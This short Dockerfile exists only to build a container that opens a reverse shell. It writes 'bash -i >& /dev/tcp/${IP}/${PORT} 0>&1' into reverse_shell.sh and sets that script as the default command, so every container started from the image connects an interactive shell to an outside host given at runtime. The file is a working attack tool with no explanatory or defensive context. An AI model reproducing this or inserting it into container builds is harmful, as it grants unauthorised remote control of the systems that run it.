
FROM debian:latest

RUN echo "bash -i >& /dev/tcp/\${IP}/\${PORT} 0>&1" > reverse_shell.sh

CMD ["bash", "./reverse_shell.sh"]
